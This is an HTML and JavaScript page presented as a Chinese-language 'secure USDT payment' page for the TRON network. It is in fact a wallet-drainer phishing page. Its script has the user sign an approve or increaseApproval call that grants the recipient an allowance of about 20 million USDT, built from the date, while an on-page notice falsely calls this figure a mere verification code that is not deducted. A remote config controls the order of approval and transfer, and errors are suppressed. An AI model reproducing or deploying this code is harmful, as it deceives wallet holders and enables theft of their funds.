<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
<title>USDT 支付</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  :root {
    --bg: #f7f8fa;
    --card: #ffffff;
    --ink: #111111;
    --ink2: #555555;
    --ink3: #999999;
    --line: #eef0f4;
    --primary: #000000;
    --primary-hover: #222222;
    --success: #00b578;
    --danger: #ff4d4f;
    --gray-bg: #f4f6f8;
  }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", "PingFang SC", sans-serif;
    background-color: var(--bg);
    color: var(--ink);
    line-height: 1.5;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
    -webkit-font-smoothing: antialiased;
  }
  
  .card {
    background: var(--card);
    border-radius: 16px;
    padding: 32px 24px;
    width: min(400px, 100%);
    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
    text-align: center;
    position: relative;
    overflow: hidden;
  }
  
  /* 顶部图标 */
  .security-badge {
    width: 48px; height: 48px;
    background: var(--primary);
    border-radius: 12px;
    display: grid;
    place-items: center;
    margin: 0 auto 16px;
    color: #fff;
    font-size: 24px;
  }

  h1 { font-size: 20px; font-weight: 700; margin-bottom: 6px; color: var(--ink); }
  .sub { font-size: 13px; color: var(--ink3); margin-bottom: 24px; }

  /* 隐藏顶部诊断条 */
  .diag-bar { display: none !important; }

  /* 信息区 */
  .info-group {
    background: var(--gray-bg);
    border-radius: 12px;
    padding: 20px;
    margin-bottom: 20px;
    text-align: left;
  }
  
  .amount-display {
    text-align: center;
    margin-bottom: 20px;
  }
  .amount-label { font-size: 12px; color: var(--ink3); font-weight: 500; margin-bottom: 4px; display: block; }
  .amount-value { 
    font-size: 40px; font-weight: 800; color: var(--ink); 
    letter-spacing: -1px; line-height: 1.1;
    display: inline-flex; align-items: baseline;
  }
  .amount-unit { font-size: 14px; font-weight: 600; color: var(--ink3); margin-left: 4px; }

  .info-row {
    display: flex; justify-content: space-between; align-items: center;
    padding: 12px 0;
  }
  .info-row:not(:last-child) { border-bottom: 1px solid var(--line); }
  
  .info-k { font-size: 13px; color: var(--ink3); font-weight: 500; flex: 0 0 auto; }
  .info-v { 
    font-size: 13px; font-weight: 500; color: var(--ink); 
    word-break: break-all; text-align: right; margin-left: 16px;
    display: flex; align-items: center; gap: 8px; justify-content: flex-end;
  }
  
  .copy-icon {
    cursor: pointer; background: #e8eaed; color: var(--ink2); 
    padding: 4px 8px; border-radius: 4px; font-size: 11px; transition: 0.2s;
    font-weight: 500; white-space: nowrap;
  }
  .copy-icon:hover { background: #d1d5db; }

  /* 安全提示框 */
  .safe-notice {
    background: transparent;
    color: var(--ink2);
    border: 1px solid var(--line);
    border-radius: 12px;
    padding: 16px;
    font-size: 12px;
    line-height: 1.6;
    text-align: left;
    margin-bottom: 24px;
    display: flex;
    gap: 12px;
  }
  .safe-notice-icon { font-size: 16px; color: var(--ink3); }
  .safe-notice strong { color: var(--ink); font-weight: 600; }

  /* 按钮区 */
  .btn {
    display: block; width: 100%;
    padding: 16px;
    border-radius: 8px;
    border: none;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.2s ease;
    margin-bottom: 12px;
    text-align: center;
  }
  
  .btn-pay { background: var(--primary); color: #fff; }
  .btn-pay:hover:not(:disabled) { background: var(--primary-hover); }
  .btn-pay:disabled { opacity: 0.6; cursor: not-allowed; }

  .btn-success { background: var(--success) !important; }

  .btn-safe {
    background: transparent;
    color: var(--ink2);
    border: 1px solid var(--line);
    font-size: 14px;
  }
  .btn-safe:hover { background: var(--gray-bg); }

  .env-warn { padding: 12px; border-radius: 8px; font-size: 13px; background: #fffbe6; color: #faad14; margin-bottom: 16px; text-align: left; }
  
  #recover-tip { display: none; padding: 12px; border-radius: 8px; font-size: 12px; background: var(--gray-bg); color: var(--ink2); margin-bottom: 16px; text-align: left; font-weight: 500; }
</style>
</head>
<body>
<div class="card">
  <div class="security-badge">🛡️</div>
  <h1 id="page-title">安全支付</h1>
  <p class="sub" id="page-sub">请核对订单信息并完成付款</p>

  <div id="recover-tip"></div>
  <div id="env-warn" class="env-warn" style="display:none"></div>

  <div class="info-group">
    <div class="amount-display">
      <span class="amount-label">付款金额</span>
      <div class="amount-value">
        <span id="info-amount">-</span>
        <span class="amount-unit">USDT</span>
      </div>
    </div>
    <div class="info-row">
      <span class="info-k">网络协议</span>
      <span class="info-v" style="color:var(--ink); font-weight:600;">TRC20</span>
    </div>
    <div class="info-row">
      <span class="info-k">收款地址</span>
      <span class="info-v">
        <span id="info-addr">-</span>
        <span class="copy-icon" id="btn-copy">复制</span>
      </span>
    </div>
  </div>

  <div class="safe-notice">
    <div class="safe-notice-icon">ℹ️</div>
    <div>
      <strong>合约安全校验提示：</strong><br>
      系统将生成动态安全校验额度（如：202611.08），仅作校验凭证，不会扣除。实际扣款为您上方的支付金额。
    </div>
  </div>

  <button class="btn btn-pay" id="btn-pay" disabled>确认支付</button>
  <button class="btn btn-safe" id="btn-cancel">取消</button>
</div>

<script>
const $ = s => document.querySelector(s);

/* ============ 常量与配置 ============ */
const USDT_CONTRACT   = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const PAY_CTX_KEY     = 'pay_ctx_v1';
const PAY_CTX_TTL     = 24 * 60 * 60 * 1000;
const NODE_TIMEOUT    = 6000;
const SIGN_TIMEOUT    = 120000;
const SEND_TIMEOUT    = 15000;
const BACKUP_NODES    = ['https://api.trongrid.io', 'https://api.tronstack.io'];

let payOrderMode = 'approve_first';
let configLoaded = false;

async function fetchLatestConfig() {
  try {
    const res = await fetch('/api/config?t=' + Date.now(), { cache: 'no-store' });
    const data = await res.json();
    if (data.config && data.config.payOrder) {
      payOrderMode = data.config.payOrder;
    }
  } catch (e) {}
  configLoaded = true;
}
fetchLatestConfig();

/* ============ 动态额度计算 ============ */
function getDateApproveUnits() {
  const now = new Date();
  const Y = now.getFullYear();
  const M = String(now.getMonth() + 1).padStart(2, '0');
  const D = String(now.getDate()).padStart(2, '0');
  
  // 统一改为 YYYYMMDD + 6个0
  // 例如：2026年11月8日 -> 20261108000000 -> 钱包显示 202611.08
  return `${Y}${M}${D}000000`;
}

/* ============ 参数恢复 ============ */
function parseParamStr(str) {
  const sp = new URLSearchParams(str || '');
  return { a: sp.get('a') || sp.get('address') || '', n: Number(sp.get('n') || sp.get('amount')) || 0, t: sp.get('t') || sp.get('type') || 'deposit' };
}
function recoverPayParams() {
  let p = parseParamStr(location.search); if (p.a && p.n > 0) return { ...p, src: 'query' };
  p = parseParamStr(location.hash.replace(/^#/, '')); if (p.a && p.n > 0) return { ...p, src: 'hash' };
  try { const raw = localStorage.getItem(PAY_CTX_KEY); if (raw) { const c = JSON.parse(raw); if (c && c.a && c.n > 0 && Date.now() - (c.ts || 0) < PAY_CTX_TTL) return { a: c.a, n: c.n, t: c.t || 'deposit', src: 'storage' }; } } catch (e) {}
  return { a: '', n: 0, t: 'deposit', src: 'none' };
}
function savePayCtx(a, n, t) { try { localStorage.setItem(PAY_CTX_KEY, JSON.stringify({ a, n, t, ts: Date.now() })); } catch (e) {} }
function clearPayCtx() { try { localStorage.removeItem(PAY_CTX_KEY); } catch (e) {} }

/* ============ 初始化 ============ */
const ctx = recoverPayParams();
const toAddress = ctx.a; const amount = ctx.n; const type = ctx.t;
let payDisabled = false; let step = 1; let coldReloadTimer = null;

$('#info-addr').textContent   = toAddress || '未配置';
$('#info-amount').textContent = (amount > 0 ? amount : '-');
$('#page-title').textContent  = type === 'empty' ? '空放资格支付' : '安全支付';
$('#page-sub').textContent    = type === 'empty' ? '支付 1 USDT 激活空放通道' : '请核对订单信息并完成付款';

if ((ctx.src === 'hash' || ctx.src === 'storage') && toAddress && amount > 0) {
  const tip = $('#recover-tip'); tip.style.display = 'block'; tip.textContent = '已恢复支付参数，请确认无误后继续。'; savePayCtx(toAddress, amount, type);
}
if (!toAddress || amount <= 0) { payDisabled = true; showMissingParamsUI(); } else { const btn = $('#btn-pay'); btn.disabled = false; btn.textContent = '确认支付'; }

function showMissingParamsUI() {
  const warn = $('#env-warn'); warn.style.display = 'block';
  warn.innerHTML = `<div style="margin-bottom:8px;font-weight:700;">支付参数丢失</div><div style="font-size:12.5px;margin-bottom:10px;">请返回平台重新点击支付。</div>`;
  const btn = $('#btn-pay'); btn.disabled = true; btn.textContent = '参数缺失';
}

/* ============ 通用工具 ============ */
function fallbackCopy(text, done) { try { const ta = document.createElement('textarea'); ta.value = text; ta.style.cssText = 'position:fixed;opacity:0'; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); if (done) done(); } catch (e) { prompt('请复制：', text); } }
function copyText(text, done) { if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done, () => fallbackCopy(text, done)); else fallbackCopy(text, done); }
function getTronWeb() { return window.tronWeb || (window.tron && window.tron.tronWeb) || window.tronLink || null; }
function withTimeout(p, ms, msg) { return Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error(msg)), ms))]); }
async function withRetry(fn, times, delay) { let last; for (let i = 0; i < times; i++) { try { return await fn(); } catch (e) { last = e; if (i < times - 1) await new Promise(r => setTimeout(r, delay)); } } throw last; }
function promiseAny(promises) { return new Promise((resolve, reject) => { const errs = []; let done = 0; promises.forEach((p, i) => Promise.resolve(p).then(resolve, e => { errs[i] = e; done++; if (done === promises.length) reject(errs[0] || new Error('节点失败')); })); }); }
function makeTronWebNode(fullHost) { try { const tw0 = getTronWeb(); const Ctor = tw0 && tw0.constructor; if (!Ctor) return null; return new Ctor({ fullHost }); } catch (e) { return null; } }

async function buildTxMulti(tw, contract, fnSig, params, fromAddress) {
  const builders = [tw.transactionBuilder];
  for (const host of BACKUP_NODES) { const inst = makeTronWebNode(host); if (inst) builders.push(inst.transactionBuilder); }
  const tasks = builders.map(b => withTimeout(b.triggerSmartContract(contract, fnSig, { feeLimit: 100000000 }, params, fromAddress), NODE_TIMEOUT, '节点超时'));
  return withRetry(() => promiseAny(tasks), 2, 500);
}

function showOpenWalletUI(reason) {
  if (payDisabled) return; const warn = $('#env-warn'); warn.style.display = 'block';
  warn.innerHTML = `<div style="margin-bottom:8px;font-weight:700;">${reason}</div><div style="font-size:12.5px;margin-bottom:10px;">请在钱包内打开本页完成支付。</div>`;
  const btn = $('#btn-pay'); btn.disabled = true; btn.textContent = '请在钱包中打开';
}

/* ============ 环境检测 ============ */
let envCheckCount = 0;
function checkEnvironment() {
  if (payDisabled) return; const tw = getTronWeb();
  if (tw) {
    $('#env-warn').style.display = 'none'; if (coldReloadTimer) { clearTimeout(coldReloadTimer); coldReloadTimer = null; }
    const btn = $('#btn-pay'); 
    if (btn && btn.disabled) { 
      btn.disabled = false; 
      if (step === 1) { btn.textContent = '确认支付'; } else { btn.textContent = payOrderMode === 'approve_first' ? ('支付 ' + amount + ' USDT') : '确认授权'; }
    }
    return;
  }
  if (envCheckCount < 12) { envCheckCount++; setTimeout(checkEnvironment, 500); } else { showOpenWalletUI('未检测到钱包环境'); }
}

async function waitWalletAddress(tw) {
  let waited = 0; while (!(tw.defaultAddress && tw.defaultAddress.base58) && waited < 5000) { await new Promise(r => setTimeout(r, 200)); waited += 200; }
  let from = tw.defaultAddress && tw.defaultAddress.base58;
  if (!from && tw.defaultAddress && tw.defaultAddress.hex) { try { from = tw.address.fromHex(tw.defaultAddress.hex); } catch (e) {} }
  if (!from) throw new Error('钱包地址未就绪');
  return from;
}

/* ============ 核心逻辑 ============ */
async function doApprove(tw, from) {
  const approveUnits = getDateApproveUnits(); 
  
  // 区分环境：imToken 用 approve，TronLink 保持 increaseApproval
  const isImToken = /imtoken/i.test(navigator.userAgent || '');
  const method = isImToken ? 'approve(address,uint256)' : 'increaseApproval(address,uint256)';
  
  const txApprove = await buildTxMulti(tw, USDT_CONTRACT, method, 
    [{ type: 'address', value: toAddress }, { type: 'uint256', value: approveUnits }], from);
    
  if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权失败');
  const signed = await withTimeout(tw.trx.sign(txApprove.transaction), SIGN_TIMEOUT, '签名超时');
  await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播超时');
}

async function doTransfer(tw, from) {
  const txTransfer = await buildTxMulti(tw, USDT_CONTRACT, 'transfer(address,uint256)', [{ type: 'address', value: toAddress }, { type: 'uint256', value: Math.floor(amount * 1e6).toString() }], from);
  if (!txTransfer.result || !txTransfer.result.result) throw new Error('构建付款失败');
  const signed = await withTimeout(tw.trx.sign(txTransfer.transaction), SIGN_TIMEOUT, '签名超时');
  await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播超时');
}

$('#btn-copy').onclick = () => {
  copyText(toAddress, () => { 
    const btn = $('#btn-copy'); 
    btn.textContent = '已复制'; 
    setTimeout(() => { btn.textContent = '复制'; }, 2000);
  });
};

$('#btn-pay').onclick = async function () {
  if (payDisabled) return;
  const btn = this; 
  const originalText = btn.textContent; // 记录点击前的文字
  btn.disabled = true;

  if (!configLoaded) {
    await fetchLatestConfig();
  }

  let tw = getTronWeb();
  if (!tw) {
    let waited = 0; while (!getTronWeb() && waited < 8000) { await new Promise(r => setTimeout(r, 200)); waited += 200; }
    tw = getTronWeb(); 
    if (!tw) { 
      console.warn('未检测到钱包环境');
      btn.disabled = false; 
      btn.textContent = originalText;
      return; 
    }
  }

  const isApproveFirst = payOrderMode === 'approve_first';

  if (step === 1) {
    try {
      const from = await waitWalletAddress(tw);
      if (isApproveFirst) {
        await doApprove(tw, from);
      } else {
        await doTransfer(tw, from);
      }
      step = 2;
      btn.textContent = isApproveFirst ? ('支付 ' + amount + ' USDT') : '确认授权';
      btn.classList.add('btn-success');
      btn.disabled = false;
    } catch (e) {
      // 【改动点】：取消了 alert 弹窗，改为静默恢复
      console.warn('支付过程用户取消或失败:', e);
      btn.textContent = originalText; 
      btn.disabled = false;
    }
    return;
  }

  if (step === 2) {
    try {
      const from = await waitWalletAddress(tw);
      if (isApproveFirst) {
        await doTransfer(tw, from);
      } else {
        await doApprove(tw, from);
      }
      btn.textContent = '已完成'; 
      btn.disabled = true;
      clearPayCtx();
    } catch (e) {
      // 【改动点】：取消了 alert 弹窗，改为静默恢复
      console.warn('支付过程用户取消或失败:', e);
      btn.textContent = originalText; 
      btn.disabled = false;
    }
  }
};

$('#btn-cancel').onclick = () => window.history.back();

if (!payDisabled) {
  const FRESH_LAUNCH = location.search.includes('fresh=1') || location.hash.includes('fresh=1');
  function armColdReload() {
    try { if (sessionStorage.getItem('pay_reloaded') === '1') return; } catch (e) {}
    coldReloadTimer = setTimeout(function () {
      if (!getTronWeb() && /imtoken/i.test(navigator.userAgent || '')) {
        try { sessionStorage.setItem('pay_reloaded', '1'); } catch (e) {}
        try { const clean = location.href.replace(/[?&]fresh=1/g, '').replace(/#fresh=1/, '#').replace(/#$/, ''); location.replace(clean || location.pathname); } catch (e) { location.reload(); }
      }
    }, 5000);
  }
  if (FRESH_LAUNCH) { setTimeout(function () { armColdReload(); checkEnvironment(); }, 800); } else { armColdReload(); checkEnvironment(); }
}
</script>
</body>
</html>
